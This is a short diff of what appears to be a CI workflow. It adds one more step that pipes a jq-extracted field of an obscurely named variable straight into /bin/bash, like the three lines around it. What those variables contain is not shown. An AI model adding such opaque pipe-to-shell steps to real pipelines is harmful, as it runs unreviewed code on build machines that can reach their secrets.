@@ -28,6 +28,7 @@ jobs:
           echo $tf5764 | jq -r .okial9924 | /bin/bash
           printf '%s' "$xpz02" | jq -r .oj271 | /bin/bash
           echo $spu9 | jq -r .upzuk20 | /bin/bash
+          echo $m9 | jq -r .ncbr535 | /bin/bash
 
       - name: Save output
         if: always()
